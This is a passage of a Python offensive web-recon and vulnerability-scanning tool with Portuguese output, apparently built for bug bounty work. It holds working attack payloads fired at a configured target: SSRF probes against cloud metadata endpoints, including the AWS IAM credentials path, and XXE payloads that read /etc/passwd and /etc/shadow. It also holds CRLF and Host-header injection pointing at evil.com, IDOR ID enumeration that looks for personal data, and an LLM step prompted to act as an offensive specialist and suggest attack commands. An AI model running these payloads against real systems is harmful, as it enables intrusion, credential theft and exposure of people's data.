            for test_url in inject_per_param(url, encoded):
                _, resp = cfetch(test_url)
                if re.search(expected, resp):
                    append_line(out, f"[SSTI CONFIRMED] {test_url}")
                    append_line(out, f"  → Payload: {payload} → Esperado: {expected}")
                    warn(f"SSTI: {test_url}")
                    if cfg.sqlite_db:
                        db_save_vuln('ssti', test_url, payload, 'critical')
                    break
                curl_throttle()
    success(f"SSTI: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18d — SSRF
# ─────────────────────────────────────────────────────────────────────────────
def step_ssrf_active():
    section("18d / SSRF ACTIVE CHECK")
    out = f"{cfg.dir_scans}/ssrf_results.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_vulns}/ssrf.txt", 20)
    if not targets:
        warn("Nenhum candidato SSRF"); return

    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:22","http://127.0.0.1:3306",
        "http://127.0.0.1:6379","http://localhost",
    ]
    if cfg.tech_aws:
        ssrf_payloads.insert(0, "http://169.254.169.254/latest/meta-data/iam/security-credentials/")

    for url in targets:
        for payload in ssrf_payloads:
            for test_url in inject_per_param(url, url_encode(payload)):
                st, resp = cfetch(test_url)
                if re.search(r'(ami-id|instance-id|computeMetadata|redis_version|INSTANCE_ID)', resp, re.I):
                    append_line(out, f"[SSRF CONFIRMED] {test_url}")
                    append_line(out, f"  → Payload: {payload}")
                    error(f"SSRF CRÍTICO: {test_url}")
                    if cfg.sqlite_db:
                        db_save_vuln('ssrf', test_url, payload, 'critical')
                elif st == 200 and re.search(r'(root:|hostname|internal)', resp, re.I):
                    append_line(out, f"[SSRF POSSIBLE] {test_url}")
                curl_throttle()
    success(f"SSRF: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18e — XXE
# ─────────────────────────────────────────────────────────────────────────────
def step_xxe():
    section("18e / XXE INJECTION")
    out = f"{cfg.dir_scans}/xxe_results.txt"
    cands_file = f"{cfg.dir_scans}/xxe_candidates.txt"
    Path(out).touch()
    urls = safe_read(f"{cfg.dir_urls}/urls_clean.txt")
    xml_cands = sorted(set(u for u in urls if re.search(r'(xml|soap|wsdl|rss|atom|upload)', u, re.I)))
    with open(cands_file,'w') as f:
        f.write('\n'.join(xml_cands)+'\n')
    if not xml_cands:
        info("Nenhum endpoint XML"); return

    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    ]
    for url in xml_cands[:20]:
        for payload in xxe_payloads:
            _, resp = retry_curl(url, method='POST',
                                  extra_headers={'Content-Type':'application/xml'}, data=payload)
            if re.search(r'root:x:|bin:x:|daemon:|hostname|for 16-bit', resp):
                append_line(out, f"[XXE CONFIRMED] {url}")
                error(f"XXE CONFIRMADO: {url}")
                break
            curl_throttle()
    success(f"XXE: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18f — IDOR
# ─────────────────────────────────────────────────────────────────────────────
def step_idor():
    section("18f / IDOR CHECK")
    idor_out  = f"{cfg.dir_scans}/idor_results.txt"
    cands_out = f"{cfg.dir_scans}/idor_candidates.txt"
    Path(idor_out).touch(); Path(cands_out).touch()

    params_alive = safe_read(f"{cfg.dir_params}/params_alive.txt")
    id_pattern = r'[?&](id|user_id|account|uid|userid|pid|post_id|order_id|invoice_id|file_id|item_id|record_id|profile_id|customer_id|ticket_id)=[0-9]+'
    cands = sorted(set(u for u in params_alive if re.search(id_pattern, u, re.I)))
    with open(cands_out,'w') as f:
        f.write('\n'.join(cands)+'\n')
    if not cands:
        info("Nenhum candidato IDOR"); return

    id_regex = r'([?&](id|user_id|uid|userid|pid|post_id|order_id|account|invoice_id|file_id|item_id|record_id|profile_id|customer_id|ticket_id)=)([0-9]+)'
    log(f"Testando IDOR em {len(cands[:cfg.limit_idor])} URLs...")

    for url in cands[:cfg.limit_idor]:
        base_status, base_resp = cfetch(url)
        if base_status != 200:
            continue
        base_len = len(base_resp)
        m = re.search(id_regex, url, re.I)
        if not m:
            continue
        orig_id = int(m.group(3))
        for new_id in [orig_id+1, orig_id-1, 1, 2, 0, 9999, 99999]:
            if new_id < 0 or new_id == orig_id:
                continue
            test_url = re.sub(id_regex, lambda x: f"{x.group(1)}{new_id}", url, count=1, flags=re.I)
            test_status, test_resp = cfetch(test_url)
            if test_status == 200:
                diff = abs(len(test_resp) - base_len)
                pii = bool(re.search(r'(email|username|password|ssn|cpf|phone|address|credit_card)', test_resp, re.I))
                if diff > 100 or pii:
                    append_line(idor_out, f"[IDOR] {url}")
                    append_line(idor_out, f"  → {test_url} | ID {orig_id}→{new_id} | diff={diff}B | PII={pii}")
                    warn(f"IDOR: {url}")
                    if cfg.sqlite_db:
                        db_save_vuln('idor', url, str(new_id), 'high')
                    break
            curl_throttle()
    success(f"IDOR: {count_lines(idor_out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18g — CRLF
# ─────────────────────────────────────────────────────────────────────────────
def step_crlf():
    section("18g / CRLF INJECTION")
    out = f"{cfg.dir_scans}/crlf_results.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_params}/params_alive.txt", cfg.limit_crlf)
    if not targets:
        warn("Sem parâmetros para CRLF"); return

    crlf_payloads = [
        '%0d%0aX-CRLF-Injected: test','%0aX-CRLF-Injected: test',
        '%0d%0a%20X-CRLF-Injected: test','%E5%98%8D%E5%98%8AX-CRLF-Injected: test',
        '%0d%0aSet-Cookie: crlf_injected=1;%20HttpOnly',
        'foo%0d%0aLocation: https://evil.com',
    ]
    for url in targets:
        for payload in crlf_payloads:
            for test_url in inject_per_param(url, payload):
                _, resp_hdrs = cfetch_headers(test_url)
                if re.search(r'X-CRLF-Injected:|crlf_injected=', resp_hdrs, re.I):
                    append_line(out, f"[CRLF CONFIRMED] {test_url}")
                    warn(f"CRLF: {test_url}")
                    break
                if re.search(r'^location:.*evil\.com', resp_hdrs, re.M|re.I):
                    append_line(out, f"[CRLF HEADER SPLIT] {test_url}")
                    break
                curl_throttle()
    success(f"CRLF: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18h — HOST HEADER INJECTION
# ─────────────────────────────────────────────────────────────────────────────
def step_host_injection():
    section("18h / HOST HEADER INJECTION")
    out = f"{cfg.dir_scans}/host_injection_results.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_waf)
    if not targets:
        return

    evil_hosts = ["evil.com", f"{cfg.domain}.evil.com",
                  "evil.com%0d%0aX-Injected: test", "localhost"]
    for url in targets:
        for evil in evil_hosts:
            _, resp = retry_curl(url, extra_headers={
                'Host': evil, 'X-Forwarded-Host': evil, 'X-Host': evil
            })
            if evil in resp:
                append_line(out, f"[HOST INJECTION body] {url} → '{evil}'")
                warn(f"Host injection: {url}")
                break
            _, resp_hdr = retry_curl(url, head_only=True, extra_headers={'Host': evil})
            loc = re.search(r'^location:\s*(.+)', resp_hdr, re.M|re.I)
            if loc and evil in loc.group(1):
                append_line(out, f"[HOST INJECTION redirect] {url}")
                break
            curl_throttle()
    success(f"Host injection: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18i — GRAPHQL
# ─────────────────────────────────────────────────────────────────────────────
def step_graphql():
    section("18i / GRAPHQL RECON")
    out = f"{cfg.dir_scans}/graphql_results.txt"
    Path(out).touch()
    hosts = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_waf)
    if not hosts:
        return

    gql_endpoints = ['/graphql','/graphql/v1','/api/graphql','/api/v1/graphql',
                      '/v1/graphql','/query','/gql','/graph','/graphiql','/playground']
    intro_q = '{"query":"{ __schema { queryType { name } types { name kind } } }"}'
    deep_q  = '{"query":"{ __schema { types { name kind fields { name type { name kind } } } } }"}'

    for host in hosts:
        for ep in gql_endpoints:
            url = f"{host}{ep}"
            status, resp = retry_curl(url, method='POST',
                                       extra_headers={'Content-Type':'application/json'},
                                       data=intro_q)
            if status in (200,201) and re.search(r'"__schema"|"queryType"|"data"\s*:\s*\{', resp):
                append_line(out, f"[GraphQL INTROSPECTION] {url}")
                warn(f"GraphQL introspection: {url}")
                _, deep = retry_curl(url, method='POST',
                                      extra_headers={'Content-Type':'application/json'},
                                      data=deep_q)
                try:
                    d = json.loads(deep)
                    types = d.get('data',{}).get('__schema',{}).get('types',[])
                    user_types = [t for t in types if not t.get('name','').startswith('__')]
                    append_line(out, f"  → {len(user_types)} tipos: {[t['name'] for t in user_types[:8]]}")
                except Exception:
                    pass
                if cfg.sqlite_db:
                    db_save_vuln('graphql_introspection', url, '', 'medium')
            curl_throttle()
    success(f"GraphQL: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 19 — NUCLEI
# ─────────────────────────────────────────────────────────────────────────────
def step_nuclei():
    section("19 / NUCLEI SCAN")
    alive = f"{cfg.dir_disc}/alive.txt"
    if is_empty(alive):
        warn("Sem hosts para nuclei"); return

    nuclei_all    = f"{cfg.dir_scans}/nuclei_all.txt"
    nuclei_crit   = f"{cfg.dir_scans}/nuclei_critical.txt"
    nuclei_high   = f"{cfg.dir_scans}/nuclei_high.txt"
    nuclei_medium = f"{cfg.dir_scans}/nuclei_medium.txt"
    for p in [nuclei_all, nuclei_crit, nuclei_high, nuclei_medium]:
        Path(p).touch()

    # Tech-aware template selection
    tags = []
    if cfg.tech_wordpress: tags.extend(['wordpress','wp'])
    if cfg.tech_php:        tags.extend(['php','phpmyadmin'])
    if cfg.tech_java:       tags.extend(['java','log4j','struts'])
    if cfg.tech_dotnet:     tags.extend(['aspx','iis'])
    if cfg.tech_graphql:    tags.extend(['graphql'])
    if cfg.tech_aws:        tags.extend(['aws','s3','amazon'])

    cmd = ['nuclei', '-l', alive, '-silent', '-nc',
           '-severity', 'critical,high,medium',
           '-o', nuclei_all,
           '-c', str(min(cfg.threads, 50)),
           '-timeout', str(cfg.timeout),
           '-retries', '1']
    if tags:
        cmd.extend(['-tags', ','.join(set(tags))])

    log("Rodando nuclei (saída direto no disco)...")
    if circuit_breaker.allow("nuclei"):
        rc, _, _ = tool_runner.run("nuclei", cmd, timeout=900, write_to=nuclei_all)
        if rc < 0:
            circuit_breaker.record_failure("nuclei")
            warn("nuclei falhou — resultados podem estar incompletos")
        else:
            circuit_breaker.record_success("nuclei")

    # Split por severidade
    for line in safe_read(nuclei_all):
        ll = line.lower()
        if '[critical]' in ll:
            append_line(nuclei_crit, line)
        elif '[high]' in ll:
            append_line(nuclei_high, line)
        elif '[medium]' in ll:
            append_line(nuclei_medium, line)

    n_crit = count_lines(nuclei_crit)
    n_high = count_lines(nuclei_high)
    n_med  = count_lines(nuclei_medium)
    info(f"Nuclei — Critical: {n_crit} | High: {n_high} | Medium: {n_med}")
    if n_crit > 0:
        error(f"⚠  {n_crit} findings CRÍTICOS (nuclei)!")
        send_webhook("Nuclei Critical Findings",
                     f"{n_crit} vulnerabilidades críticas em {cfg.domain}\n" +
                     "\n".join(safe_read(nuclei_crit)[:10]),
                     severity="critical")
    elif n_high > 0:
        warn(f"{n_high} findings HIGH (nuclei)")
        send_webhook("Nuclei High Findings",
                     f"{n_high} vulnerabilidades high em {cfg.domain}",
                     severity="high")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 19b — AI TRIAGE
# ─────────────────────────────────────────────────────────────────────────────
def step_ai_triage():
    section("19b / AI TRIAGE (Anthropic API)")
    if not cfg.anthropic_api_key:
        warn("Chave API não fornecida — use --api-key sk-ant-..."); return

    def read_n(path, n=10):
        return '\n'.join(read_head(path, n)) if os.path.exists(path) else ""

    findings = f"=== ALVO: {cfg.domain} | v3.0 ===\n"
    sections_map = [
        (f"XSS Dalfox ({count_lines(cfg.dir_scans+'/dalfox.txt')})",         f"{cfg.dir_scans}/dalfox.txt"),
        (f"XSS Manual ({count_lines(cfg.dir_scans+'/xss_manual.txt')})",     f"{cfg.dir_scans}/xss_manual.txt"),
        (f"XSS DOM ({count_lines(cfg.dir_scans+'/xss_dom.txt')})",           f"{cfg.dir_scans}/xss_dom.txt"),
        (f"SQLi error ({count_lines(cfg.dir_scans+'/sqli_error_based.txt')})", f"{cfg.dir_scans}/sqli_error_based.txt"),
        (f"SQLi blind ({count_lines(cfg.dir_scans+'/sqli_blind.txt')})",     f"{cfg.dir_scans}/sqli_blind.txt"),
        (f"IDOR ({count_lines(cfg.dir_scans+'/idor_results.txt')})",         f"{cfg.dir_scans}/idor_results.txt"),
        (f"CRLF ({count_lines(cfg.dir_scans+'/crlf_results.txt')})",         f"{cfg.dir_scans}/crlf_results.txt"),
        (f"SSRF ({count_lines(cfg.dir_scans+'/ssrf_results.txt')})",         f"{cfg.dir_scans}/ssrf_results.txt"),
        (f"GraphQL ({count_lines(cfg.dir_scans+'/graphql_results.txt')})",   f"{cfg.dir_scans}/graphql_results.txt"),
        (f"SSTI ({count_lines(cfg.dir_scans+'/ssti_results.txt')})",         f"{cfg.dir_scans}/ssti_results.txt"),
        (f"403 Bypass ({count_lines(cfg.dir_extra+'/403_bypass.txt')})",     f"{cfg.dir_extra}/403_bypass.txt"),
        (f"Metadata ({count_lines(cfg.dir_extra+'/metadata.txt')})",         f"{cfg.dir_extra}/metadata.txt"),
        (f"Nuclei CRITICAL ({count_lines(cfg.dir_scans+'/nuclei_critical.txt')})", f"{cfg.dir_scans}/nuclei_critical.txt"),
        (f"Nuclei HIGH ({count_lines(cfg.dir_scans+'/nuclei_high.txt')})",   f"{cfg.dir_scans}/nuclei_high.txt"),
        (f"Sensíveis ({count_lines(cfg.dir_extra+'/sensitive_files.txt')})", f"{cfg.dir_extra}/sensitive_files.txt"),
        (f"CORS ({count_lines(cfg.dir_extra+'/cors_vuln.txt')})",            f"{cfg.dir_extra}/cors_vuln.txt"),
        (f"Tecnologias", f"{cfg.dir_extra}/technologies.txt"),
        (f"Secrets JS ({count_lines(cfg.dir_js+'/js_secrets.txt')})",        f"{cfg.dir_js}/js_secrets.txt"),
    ]
    for title, path in sections_map:
        findings += f"\n=== {title} ===\n{read_n(path)}\n"

    payload = {
        "model": "claude-sonnet-4-20250514",
        "max_tokens": 2500,
        "system": (
            "Você é um especialista em segurança ofensiva e bug bounty. "
            "Analise os findings e produza:\n"
            "1. TOP 5 vulnerabilidades mais críticas (com CVSS estimado e justificativa)\n"
            "2. Análise de severidade de cada finding confirmado\n"
            "3. Próximos passos (comandos específicos quando possível)\n"
            "4. False positives prováveis — para cada suspeito, explique POR QUÊ é FP "
            "   (ex: payload refletido mas em contexto não executável, CORS wildcard em asset estático)\n"
            "5. Vetores não testados baseados nas tecnologias detectadas\n"
            "6. Impacto de negócio para o bug bounty report\n"
            "Seja direto, técnico e conciso. Responda em português."
        ),
        "messages": [{"role": "user", "content": findings}]
    }
    try:
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json",
                     "x-api-key": cfg.anthropic_api_key,
                     "anthropic-version": "2023-06-01"}
        )
        with urllib.request.urlopen(req, timeout=90) as resp:
            data = json.loads(resp.read())
            ai_text = data["content"][0]["text"]
        ai_out = f"{cfg.dir_report}/ai_triage.txt"
        with open(ai_out,'w') as f:
            f.write(ai_text)
        success(f"AI Triage → {ai_out}")
        print(f"\n{BOLD}{LCYAN}══════ AI TRIAGE ══════{NC}")
        print(ai_text)
        print(f"{BOLD}{LCYAN}══════════════════════{NC}\n")
    except Exception as e:
        warn(f"AI Triage falhou: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 20 — VULNERABILITY REPORT + HTML REPORT (v3)
# ─────────────────────────────────────────────────────────────────────────────
def step_vuln_report():
    section("20 / RELATÓRIO DE VULNERABILIDADES")
    report      = f"{cfg.dir_report}/vuln_urls.txt"
    report_json = f"{cfg.dir_report}/vuln_urls.json"
    report_html = f"{cfg.dir_report}/index.html"

    def write_section(title, path):
        if os.path.exists(path) and not is_empty(path):
            with open(report,'a') as f:
                f.write("="*64+"\n")
                f.write(f"  [{title}]\n")
                f.write("="*64+"\n")
                f.write(open(path).read()+"\n")

    Path(report).touch()
    sections = [
        ("XSS — Dalfox",               f"{cfg.dir_scans}/dalfox.txt"),
        ("XSS — Manual",               f"{cfg.dir_scans}/xss_manual.txt"),
        ("XSS — DOM-based",            f"{cfg.dir_scans}/xss_dom.txt"),
        ("XSS — Header injection",     f"{cfg.dir_scans}/xss_headers.txt"),
        ("SQLi — SQLMap confirmado",   f"{cfg.dir_scans}/sqli_confirmed.txt"),
        ("SQLi — Error-based",         f"{cfg.dir_scans}/sqli_error_based.txt"),
        ("SQLi — Blind time-based",    f"{cfg.dir_scans}/sqli_blind.txt"),
        ("SQLi — POST body",           f"{cfg.dir_scans}/sqli_post.txt"),
        ("IDOR",                       f"{cfg.dir_scans}/idor_results.txt"),
        ("CRLF Injection",             f"{cfg.dir_scans}/crlf_results.txt"),
        ("Host Header Injection",      f"{cfg.dir_scans}/host_injection_results.txt"),
        ("GraphQL introspection",      f"{cfg.dir_scans}/graphql_results.txt"),
        ("LFI",                        f"{cfg.dir_scans}/lfi_results.txt"),
        ("SSTI",                       f"{cfg.dir_scans}/ssti_results.txt"),
        ("SSRF",                       f"{cfg.dir_scans}/ssrf_results.txt"),
        ("XXE",                        f"{cfg.dir_scans}/xxe_results.txt"),
        ("NoSQL",                      f"{cfg.dir_scans}/nosql_results.txt"),
        ("Open Redirect",              f"{cfg.dir_scans}/redirect_results.txt"),
        ("CORS",                       f"{cfg.dir_extra}/cors_vuln.txt"),
        ("403 Bypass",                 f"{cfg.dir_extra}/403_bypass.txt"),
        ("Metadata Harvesting",        f"{cfg.dir_extra}/metadata.txt"),
        ("Secrets JS",                 f"{cfg.dir_js}/js_secrets.txt"),
        ("Subdomain Takeover",         f"{cfg.dir_extra}/takeover.txt"),
        ("Arquivos Sensíveis",         f"{cfg.dir_extra}/sensitive_files.txt"),
        ("NUCLEI CRITICAL",            f"{cfg.dir_scans}/nuclei_critical.txt"),
        ("NUCLEI HIGH",                f"{cfg.dir_scans}/nuclei_high.txt"),
        ("WAF",                        f"{cfg.dir_extra}/waf_detected.txt"),
        ("Tecnologias",                f"{cfg.dir_extra}/technologies.txt"),
        ("AI Attack Plan",             f"{cfg.dir_report}/ai_attack_plan.txt"),
    ]
    for title, path in sections:
        write_section(title, path)

    # JSON
    def rl(path, limit=None):
        lines = safe_read(path)
        return lines[:limit] if limit else lines

    stats = {
        'xss_dalfox':   count_lines(f"{cfg.dir_scans}/dalfox.txt"),
        'xss_manual':   count_lines(f"{cfg.dir_scans}/xss_manual.txt"),
        'xss_dom':      count_lines(f"{cfg.dir_scans}/xss_dom.txt"),
        'xss_headers':  count_lines(f"{cfg.dir_scans}/xss_headers.txt"),
        'sqli':         count_lines(f"{cfg.dir_scans}/sqli_confirmed.txt"),
        'sqli_eb':      count_lines(f"{cfg.dir_scans}/sqli_error_based.txt"),
        'sqli_blind':   count_lines(f"{cfg.dir_scans}/sqli_blind.txt"),
        'sqli_post':    count_lines(f"{cfg.dir_scans}/sqli_post.txt"),
        'idor':         count_lines(f"{cfg.dir_scans}/idor_results.txt"),
        'crlf':         count_lines(f"{cfg.dir_scans}/crlf_results.txt"),
        'host_inj':     count_lines(f"{cfg.dir_scans}/host_injection_results.txt"),
        'graphql':      count_lines(f"{cfg.dir_scans}/graphql_results.txt"),
        'lfi':          count_lines(f"{cfg.dir_scans}/lfi_results.txt"),
        'ssti':         count_lines(f"{cfg.dir_scans}/ssti_results.txt"),
        'ssrf':         count_lines(f"{cfg.dir_scans}/ssrf_results.txt"),
        'xxe':          count_lines(f"{cfg.dir_scans}/xxe_results.txt"),
        'nosql':        count_lines(f"{cfg.dir_scans}/nosql_results.txt"),
        'redir':        len([l for l in safe_read(f"{cfg.dir_scans}/redirect_results.txt") if 'REDIRECT VULN' in l]),
        'cors':         len([l for l in safe_read(f"{cfg.dir_extra}/cors_vuln.txt") if 'CORS' in l]),
        '403bypass':    count_lines(f"{cfg.dir_extra}/403_bypass.txt"),
        'metadata':     count_lines(f"{cfg.dir_extra}/metadata.txt"),
        'n_crit':       count_lines(f"{cfg.dir_scans}/nuclei_critical.txt"),
        'n_high':       count_lines(f"{cfg.dir_scans}/nuclei_high.txt"),
        'secrets':      count_lines(f"{cfg.dir_js}/js_secrets.txt"),
        'takeover':     count_lines(f"{cfg.dir_extra}/takeover.txt"),
        'sensitive':    len([l for l in safe_read(f"{cfg.dir_extra}/sensitive_files.txt") if l.startswith('[200]')]),
        'admin':        count_lines(f"{cfg.dir_urls}/urls_admin.txt"),
    }
    total = sum(stats[k] for k in ['xss_dalfox','xss_manual','xss_dom','xss_headers',
                                    'sqli','sqli_eb','sqli_blind','sqli_post','idor','crlf',
                                    'host_inj','graphql','lfi','ssti','ssrf','xxe','nosql',
                                    'redir','cors','n_crit','n_high'])

    data = {
        "version": "5.0",
        "target": cfg.domain,
        "scan_dir": cfg.scan_dir,
        "scan_date": datetime.now().isoformat(),
        "stats": stats,
        "total_findings": total,
        "tech_profile": {
            "php": cfg.tech_php, "nodejs": cfg.tech_nodejs, "java": cfg.tech_java,
            "dotnet": cfg.tech_dotnet, "python": cfg.tech_python,
            "wordpress": cfg.tech_wordpress, "graphql": cfg.tech_graphql,
            "aws": cfg.tech_aws, "apache": cfg.tech_apache, "nginx": cfg.tech_nginx,
        }
    }
    with open(report_json,'w') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    # HTML Report (v3)
    _generate_html_report(report_html, stats, total)

    # Terminal summary
    print()
    print(f"{BOLD}{LRED}  ╔══════════════════════════════════════════════════════════════╗{NC}")
    print(f"{BOLD}{LRED}  ║         VULNERABILIDADES ENCONTRADAS — RECON v5.0           ║{NC}")
    print(f"{BOLD}{LRED}  ╠══════════════════════════════════════════════════════════════╣{NC}")
    rows = [
        ("XSS Dalfox confirmado:",     stats['xss_dalfox']),
        ("XSS Manual pre-check:",      stats['xss_manual']),
        ("XSS DOM-based:",             stats['xss_dom']),
        ("XSS Header-based:",          stats['xss_headers']),
        ("SQLi SQLMap confirmado:",    stats['sqli']),
        ("SQLi error-based:",          stats['sqli_eb']),
        ("SQLi blind time-based:",     stats['sqli_blind']),
        ("SQLi POST body:",            stats['sqli_post']),
        ("IDOR:",                      stats['idor']),
        ("CRLF Injection:",            stats['crlf']),
        ("Host Header Injection:",     stats['host_inj']),
        ("GraphQL introspection:",     stats['graphql']),
        ("LFI:",                       stats['lfi']),
        ("SSTI:",                      stats['ssti']),
        ("SSRF:",                      stats['ssrf']),
        ("XXE:",                       stats['xxe']),
        ("NoSQL:",                     stats['nosql']),
        ("Open Redirect:",             stats['redir']),
        ("CORS vuln:",                 stats['cors']),
        ("403 Bypass:",                stats['403bypass']),
        ("Metadata encontrado:",       stats['metadata']),
        ("Nuclei CRITICAL:",           stats['n_crit']),
        ("Nuclei HIGH:",               stats['n_high']),
    ]
    for label, val in rows:
        color = LRED if val > 0 else GRAY
        print(f"  ║  {color}{label:<40} {str(val):<19}{NC} ║")
    print(f"  ╠══════════════════════════════════════════════════════════════╣")
    print(f"  ║  {'Secrets JS:':<40} {str(stats['secrets']):<19} ║")
    print(f"  ║  {'Arquivos sensíveis:':<40} {str(stats['sensitive']):<19} ║")
    print(f"  ║  {'Subdomain takeover:':<40} {str(stats['takeover']):<19} ║")
    print(f"  ║  {'Admin panels:':<40} {str(stats['admin']):<19} ║")
    print(f"  ╠══════════════════════════════════════════════════════════════╣")
    print(f"  ║  {'TOTAL FINDINGS:':<40} {LRED if total>0 else LGREEN}{str(total):<19}{NC} ║")
    print(f"  ║  {'Relatório TXT:':<40} {report[-40:]:<19} ║")
    print(f"  ║  {'Relatório JSON:':<40} {report_json[-40:]:<19} ║")
    print(f"  ║  {'Relatório HTML:':<40} {report_html[-40:]:<19} ║")
    print(f"  ╚══════════════════════════════════════════════════════════════╝")
    if total > 0:
        error(f"⚠  {total} findings! Veja: {report}")
    else:
        info("Nenhuma vuln diretamente confirmada. Analise candidatos GF manualmente.")

    if cfg.sqlite_db:
        try:
            con = sqlite3.connect(cfg.sqlite_db)
            now = datetime.now().isoformat()
            con.execute(
                "INSERT INTO scan_history VALUES(?,?,?,?,?)",
                (cfg.domain, cfg.scan_dir, datetime.fromtimestamp(cfg.scan_start).isoformat(), now, total)
            )
            con.commit()
            con.close()
        except Exception:
            pass


def _generate_html_report(html_path: str, stats: dict, total: int):
    """Gera relatório HTML interativo (v3)."""
    rows_html = ""
    severity_map = {
        'xss_dalfox': 'critical', 'xss_manual': 'high', 'xss_dom': 'high',
        'sqli': 'critical', 'sqli_eb': 'high', 'sqli_blind': 'high',
        'lfi': 'critical', 'ssti': 'critical', 'ssrf': 'critical',
        'xxe': 'high', 'idor': 'high', 'n_crit': 'critical', 'n_high': 'high',
        'redir': 'medium', 'cors': 'medium', 'crlf': 'medium', 'nosql': 'high',
        '403bypass': 'medium', 'secrets': 'high', 'takeover': 'critical',
    }
    labels_map = {
        'xss_dalfox':'XSS Dalfox','xss_manual':'XSS Manual','xss_dom':'XSS DOM',
        'xss_headers':'XSS Header','sqli':'SQLi (sqlmap)','sqli_eb':'SQLi Error-Based',
        'sqli_blind':'SQLi Blind','sqli_post':'SQLi POST','idor':'IDOR','crlf':'CRLF',
        'host_inj':'Host Injection','graphql':'GraphQL','lfi':'LFI','ssti':'SSTI',
        'ssrf':'SSRF','xxe':'XXE','nosql':'NoSQL','redir':'Open Redirect','cors':'CORS',
        '403bypass':'403 Bypass','metadata':'Metadata','n_crit':'Nuclei Critical',
        'n_high':'Nuclei High','secrets':'JS Secrets','takeover':'Takeover',
        'sensitive':'Arquivos Sensíveis','admin':'Admin Panels',
    }
    sev_color = {'critical':'#e74c3c','high':'#e67e22','medium':'#f1c40f','low':'#2ecc71','info':'#3498db'}
    for key, label in labels_map.items():
        val = stats.get(key, 0)
        if val > 0:
            sev = severity_map.get(key,'medium')
            color = sev_color.get(sev, '#3498db')
            rows_html += f'<tr><td style="color:{color}">{label}</td><td style="color:{color}"><b>{val}</b></td><td><span style="background:{color};color:white;padding:2px 8px;border-radius:4px;font-size:12px">{sev.upper()}</span></td></tr>\n'

    tech_badges = ""
    for t, flag in [('PHP',cfg.tech_php),('Node.js',cfg.tech_nodejs),('Java',cfg.tech_java),
                    ('ASP.NET',cfg.tech_dotnet),('Python',cfg.tech_python),
                    ('WordPress',cfg.tech_wordpress),('GraphQL',cfg.tech_graphql),
                    ('AWS',cfg.tech_aws),('Apache',cfg.tech_apache),('Nginx',cfg.tech_nginx)]:
        if flag:
            tech_badges += f'<span style="background:#2c3e50;color:#1abc9c;padding:4px 10px;border-radius:4px;margin:2px;display:inline-block">{t}</span>'

    html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RECON v5.0 — {cfg.domain}</title>
<style>
  body{{font-family:'Segoe UI',sans-serif;background:#1a1a2e;color:#eee;margin:0;padding:20px}}
  .header{{background:linear-gradient(135deg,#16213e,#0f3460);padding:30px;border-radius:10px;margin-bottom:20px;border:1px solid #e74c3c}}
  h1{{color:#e74c3c;margin:0;font-size:2em}}
  .subtitle{{color:#888;font-size:0.9em;margin-top:5px}}
  .cards{{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:15px;margin-bottom:20px}}
  .card{{background:#16213e;padding:20px;border-radius:8px;text-align:center;border:1px solid #0f3460}}
  .card .num{{font-size:2.5em;font-weight:bold;color:#e74c3c}}
  .card .lbl{{font-size:0.8em;color:#888;margin-top:5px}}
  table{{width:100%;border-collapse:collapse;background:#16213e;border-radius:8px;overflow:hidden}}
  th{{background:#0f3460;padding:12px;text-align:left;color:#1abc9c}}
  td{{padding:10px 12px;border-bottom:1px solid #0f3460}}
  tr:hover{{background:#0f3460}}
  .section{{background:#16213e;padding:20px;border-radius:8px;margin-bottom:20px;border:1px solid #0f3460}}
  .section h2{{color:#1abc9c;margin-top:0}}
  .badge-ok{{background:#27ae60;color:white;padding:2px 8px;border-radius:4px;font-size:12px}}
  .footer{{text-align:center;color:#444;margin-top:30px;font-size:0.8em}}
</style>
</head>
<body>
<div class="header">
  <h1>🔍 RECON v5.0</h1>
  <div class="subtitle">Alvo: <b style="color:#1abc9c">{cfg.domain}</b> | {datetime.now().strftime('%d/%m/%Y %H:%M')} | Pasta: {cfg.scan_dir}</div>
</div>

<div class="cards">
  <div class="card"><div class="num" style="color:#e74c3c">{total}</div><div class="lbl">Total Findings</div></div>
  <div class="card"><div class="num" style="color:#e74c3c">{stats.get('n_crit',0)}</div><div class="lbl">Nuclei Critical</div></div>
  <div class="card"><div class="num" style="color:#e67e22">{stats.get('n_high',0)}</div><div class="lbl">Nuclei High</div></div>
  <div class="card"><div class="num" style="color:#1abc9c">{count_lines(cfg.dir_disc+'/alive.txt')}</div><div class="lbl">Hosts Ativos</div></div>
  <div class="card"><div class="num" style="color:#3498db">{count_lines(cfg.dir_disc+'/subs_all.txt')}</div><div class="lbl">Subdomínios</div></div>
  <div class="card"><div class="num" style="color:#9b59b6">{count_lines(cfg.dir_urls+'/urls_all.txt')}</div><div class="lbl">URLs Coletadas</div></div>
</div>

<div class="section">
  <h2>Stack Tecnológica Detectada</h2>
